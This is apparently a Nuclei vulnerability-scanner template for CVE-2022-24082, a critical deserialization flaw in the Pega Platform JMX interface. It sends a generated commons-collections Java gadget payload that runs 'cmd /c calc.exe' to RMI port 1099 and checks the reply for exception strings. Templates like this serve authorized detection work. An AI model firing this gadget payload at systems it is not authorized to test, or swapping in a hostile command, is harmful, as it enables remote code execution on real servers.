id: CVE-2022-24082

info:
  name: Pega Platform JMX Interface Serialized Payload Upload Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: If an on-premise installation of the Pega Platform is configured with the port for the JMX interface exposed to the Internet and port filtering is not properly configured, then it may be possible to upload serialized payloads to attack the underlying system. This does not affect systems running on PegaCloud due to its design and architecture.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-24082
    cwe-id: CWE-502
    epss-score: 0.01455
    epss-percentile: 0.87218
    cpe: cpe:2.3:a:pega:infinity:*:*:*:*:*:*:*:*
  metadata:
    vendor: pega
    product: infinity
  impact: |
    Successful exploitation could lead to remote code execution.
  remediation: |
    Apply the necessary patches provided by Pega Platform to mitigate the vulnerability.
network:
  - inputs:
      - data: "{{base64('{{generate_java_gadget('commons-collections3.1', 'cmd /c calc.exe', 'base64')}}')}}"
    host:
      - "{{Hostname}}"
    port: 1099
    read-size: 1024
    matchers:
      - type: word
        words:
          - "java.rmi.UnmarshalException"
          - "java.lang.ClassNotFoundException"
        part: data